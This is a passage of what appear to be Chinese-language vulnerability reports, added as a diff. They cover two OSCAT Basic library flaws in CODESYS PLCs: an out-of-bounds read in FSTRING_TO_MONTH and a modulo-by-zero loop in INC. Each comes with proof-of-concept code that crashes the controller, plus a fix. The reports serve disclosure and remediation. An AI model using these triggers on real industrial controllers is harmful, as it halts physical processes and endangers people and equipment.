+2.1 缺陷代码位置
+漏洞存在于 FSTRING_TO_MONTH 函数对输入语言参数 LANG（类型为有符号整数 INT）的处理逻辑及后续的数组访问中：
+Structured Text
+
+// [缺陷点1] 仅使用了 MIN 限制上界，缺失对负数的下界防护
+IF LANG = 0 THEN 
+    lx := LANGUAGE.DEFAULT; 
+ELSE 
+    lx := MIN(LANG, LANGUAGE.LMAX); 
+END_IF;
+// ...
+FOR FSTRING_TO_MONTH := 1 TO 12 DO
+    // [缺陷点2] lx 作为第一维度索引，若为负数将发生越界读取
+    IF MTH = language.MONTHS[lx, FSTRING_TO_MONTH] THEN RETURN; END_IF; 
+    // ...
+END_FOR;
+2.2 根因分析
+该漏洞的根本原因在于不完备的输入校验与工业运行时的内存保护机制发生碰撞：
+	1. 下溢触发： LANG 声明为有符号整数 INT。当攻击者传入负值（例如 LANG := -1）时，MIN(-1, LANGUAGE.LMAX) 的计算结果将合法地返回 -1。
+	2. 非法内存偏移： 随后，程序将 lx = -1 作为多维数组 language.MONTHS 的第一维度索引。由于该数组的合法定义通常从 0 开始（即 0..LANGUAGE.LMAX），索引 -1 使得内存寻址指针回退到了数组基址之前的内存区域。
+	3. 硬件级崩溃： 为了保障任务执行的实时性周期，多数工业软 PLC 在编译层默认禁用了数组隐式边界检查。当 CPU 尝试读取这个越界（可能跨越内存页边界或命中不可读的受保护区域）的非法地址时，硬件内存管理单元（MMU）会捕获到越权访问，触发段错误，导致 PLC 进程抛出致命的访问违例异常。
+3. 复现步骤
+环境准备： 安装 CODESYS V3.5 SP21 Patch 3，下载并导入 oscat_basic 3.3.5.0 库。添加设备 CODESYS Control Win V3 x64 或 CODESYS Control for Linux SL。
+3.1 攻击向量准备
+模拟工业现场中，HMI 触摸屏或上位机系统由于故障或被劫持，向 PLC 下发了非法的语言枚举值：
+	• MTH := 'January' （合法的月份字符串，确保程序进入 FOR 循环读取逻辑）
+	• LANG := -1 （恶意注入参数，触发下边界绕过）
+3.2 复现代码 (PoC)
+PROGRAM PLC_PRG
+VAR
+    // 1. 提供合法的输入字符串，引导执行流进入数组匹配循环
+    testMTH : STRING[20] := 'January';
+    // 2. 注入恶意负数参数作为语言索引，实施越界读取攻击
+    maliciousLANG : INT := -1; 
+    res : INT;
+    trigger_crash : BOOL := FALSE;
+END_VAR
+IF trigger_crash THEN
+    // 执行该行代码时，函数内部将访问 language.MONTHS[-1, 1]
+    res := FSTRING_TO_MONTH(MTH := testMTH, LANG := maliciousLANG);
+    trigger_crash := FALSE;
+END_IF
+3.3 测试结果与崩溃证明
+将程序下载至运行环境并将 trigger_crash 置为 TRUE：
+	1. 运行时尝试读取负向越界的内存数据。
+	2. CODESYS 运行时瞬间捕获到严重错误，抛出 *EXCEPTION* [AccessViolation] occurred 日志。
+	3. PLC 设备状态指示灯立刻由 RUN（绿）转为 STOP/EXCEPTION（红），所有物理输出模块被强制切断
+	4. 断电，验证了拒绝服务（DoS）的切实危害。
+
+	
+
+	
+
+
+4. 影响评估
+在传统的 IT 安全中，越界读取（如著名的 Heartbleed 漏洞）主要导致敏感信息泄露。但在 OT（操作技术）环境中，其危害往往被急剧放大。
+由于工业控制器的底层架构特性，当该函数处理来自外部网络报文、HMI 配方下发或 MQTT JSON 解析的畸形 LANG 参数时，单次的越界读取操作即会直接触发系统级崩溃（System-level DoS）。在诸如轨道交通信号、化工反应釜控制或大型流水线等高连续性要求的场景中，控制器的瞬间停机将导致极高的设备损坏风险和不可估量的经济损失。
+5. 修复建议
+强烈建议在处理有符号整数作为数组索引时，进行严格的“双向边界钳制”。
+修复方案：使用 LIMIT 函数替代 MIN 函数，强制保障下界不低于 0。
+
+// 修改前（缺陷逻辑）：
+// IF LANG = 0 THEN lx := LANGUAGE.DEFAULT; ELSE lx := MIN(LANG, LANGUAGE.LMAX); END_IF;
+// 修改后（安全逻辑）：
+IF LANG = 0 THEN 
+    lx := LANGUAGE.DEFAULT; 
+ELSE 
+    lx := LIMIT(0, LANG, LANGUAGE.LMAX);  // 强制限定索引区间为 [0, LMAX]
+END_IF;
+6. 函数源码 
+FUNCTION FSTRING_TO_MONTH : INT
+VAR_INPUT
+	MTH : STRING[20];
+	LANG : INT;
+END_VAR
+VAR
+	lx: INT;
+END_VAR
+IF LANG = 0 THEN lx := LANGUAGE.DEFAULT; ELSE lx := MIN(LANG, LANGUAGE.LMAX); END_IF;
+MTH := TRIM(mth);
+MTH := CAPITALIZE(LOWERCASE(MTH));
+FOR FSTRING_TO_MONTH := 1 TO 12 DO
+	IF MTH = language.MONTHS[lx, FSTRING_TO_MONTH] THEN RETURN; END_IF;
+	IF MTH = language.MONTHS3[lx, FSTRING_TO_MONTH] THEN RETURN; END_IF;
+END_FOR;
+FSTRING_TO_MONTH := STRING_TO_INT(MTH)
+
+漏洞分析报告：OSCAT Basic 库 INC 函数逻辑缺陷导致的拒绝服务漏洞
+漏洞类型： Division by Zero 导致的非预期逻辑死锁及拒绝服务 (CWE-369 / CWE-835 / CWE-400)
+受影响组件： OSCAT Basic 库 (版本 3.3.5.0 及之前版本)
+严重程度： 高 (High) - 可导致 PLC 运行时环境看门狗超时并全面停机
+1. 摘要
+在对工业自动化开源组件库 OSCAT Basic 进行安全审计时，发现其 INC 函数存在一处严重的除零（MOD 0）算术逻辑漏洞。当外部输入参数 M 被恶意构造或意外设置为 -1 时，会导致内部取模运算的除数为零。在现代工业软 PLC 运行时（如 CODESYS Control Win V3 / Linux SL）中，该异常会被底层静默拦截，并强制函数恒定返回 0。此静默失败会严重毒化调用该函数的工业控制流，导致依赖该函数进行状态推进的标准业务代码（如轮询、步进或配方执行）陷入无限死循环。由于工控任务具有严格的实时性要求，这将在极短时间内（数毫秒至数秒）触发 PLC 的系统级看门狗超时（Watchdog Timeout），强制控制器进入 EXCEPTION 停机状态，最终造成针对物理生产过程的拒绝服务攻击（DoS）。
+2. 漏洞详情
+2.1 缺陷代码位置
+缺陷位于 INC 函数内部唯一的取模运算处：
+// 当 M = -1 时，(M + 1) 为 0，触发 MOD 0
+INC := (X + D + M + 1) MOD (M + 1);
+2.2 根因分析
+INC 函数在 OSCAT 库中常用于在 [0, M] 范围内执行带步长 D 的循环递增运算。然而，函数入口未对上限界定参数 M 进行有效性校验：
+	1. 除零触发： 表达式右侧的操作数（除数）为 (M + 1)。当外部传入 M = -1 时，除数计算结果为 0，从而触发对零取模的非法算术操作。
+	2. 底层静默与逻辑退化： 在现代工业级运行时环境（如基于 V3 架构的软 PLC）中，为防止系统直接崩溃，底层内核捕获了此运算异常并静默返回 0。此时，无论输入变量 X（当前值）和 D（步长）为何值，INC 函数完全丧失其递增计算的语义，不可逆地退化为一个永远返回 0 的常值函数。
+	3. 连锁死锁： 由于该函数通常被用作循环变量的迭代器，返回值的固化将导致外层控制回路（如 WHILE 或 REPEAT 语句）永远无法满足退出条件，从而引发 CWE-835 无限循环。
+3. 复现步骤
+环境准备： 安装 CODESYS V3.5 SP21 Patch 3，下载并导入 oscat_basic 3.3.5.0 库。添加设备 CODESYS Control Win V3 x64 或 CODESYS Control for Linux SL。
+3.1 攻击向量准备
+模拟实际工控场景中，上位机配方系统或 HMI 参数下发被篡改：
+	• X := 0 (当前步数，任意值)
+	• D := 1 (递增步长，任意值)
+	• M := -1 (关键漏洞触发参数：导致除数为零)
+3.2 复现代码 (PoC)
+构造一段典型的依赖 INC 进行步进控制的业务代码片段：
+PROGRAM PLC_PRG
+VAR
+    index : INT := 0;
+    step_size : INT := 1;
+    malicious_M : INT := -1; (* 模拟被外部篡改的阈值参数 *)
+    trigger_vuln : BOOL := FALSE;
+END_VAR
+(* 模拟工控循环轮询或步进任务 *)
+IF trigger_vuln THEN
+    index := 0;
+    (* 预期行为：index 每次增加 1，到达 10 后跳出循环 *)
+    (* 实际行为：因漏洞存在，INC 永远返回 0，导致极其致命的死循环 *)
+    WHILE index < 10 DO
+        index := INC(X := index, D := step_size, M := malicious_M);
+    END_WHILE;
+    trigger_vuln := FALSE;
+END_IF
+3.3 测试结果与物理崩溃证明
+将程序下载至运行环境，设置任务循环周期（如 10ms）与看门狗超时时间（如 2000ms）。将 trigger_vuln 置为 TRUE 后：
+	1. WHILE 循环立刻陷入死锁，PLC 任务当前周期的执行时间迅速飙升。
+	2. 当耗时超过设定的超时阈值后，底层监控机制介入，触发系统级看门狗超时 (Watchdog Timeout)。
+	3. CODESYS 运行时抛出 *EXCEPTION* [Watchdog] occurred 的致命系统日志。
+	4. 控制器被强行拉入 EXCEPTION / STOP 状态（亮红灯），所有物理 I/O 输出被立即切断，造成整机拒绝服务。
+
+
+
+
+4. 影响评估
+在工业自动化场景（OT 环境）中，该漏洞的威胁等级极高。攻击者无需具备篡改 PLC 梯形图或 ST 源代码的权限，只需通过暴露的工业协议接口（如 Modbus TCP、OPC UA 或 HMI 画面）向暴露的 M 变量写入畸形边界值（-1），即可“借刀杀人”。利用正常业务逻辑中对 INC 函数的调用，攻击者能瞬间拖死 PLC 的主扫描周期，引发看门狗停机。这将导致工厂流水线骤停、工艺失控，在连续制造或危化品控制场景中可能引发物理安全事故。
+5. 修复建议
+强烈建议在执行运算前对参数 M 增加边界防御，确保除数绝对不为零。
+修复方案：
+Structured Text
+
+(* 增加防御性校验：确保除数非零 *)
+IF M <> -1 THEN
+    INC := (X + D + M + 1) MOD (M + 1);
+ELSE
+    (* 处理异常输入，避免逻辑死锁。可根据业务场景返回当前值 X *)
+    INC := X; 
+    (* 或触发应用程序级错误告警 *)
+END_IF;
+6. 函数源码 (OSCAT 原始缺陷代码)
+Structured Text
+
+FUNCTION INC : INT
+VAR_INPUT
+	X : INT;
+	D : INT;
+	M : INT;
+END_VAR
+INC := (X + D + M + 1) MOD (M + 1);
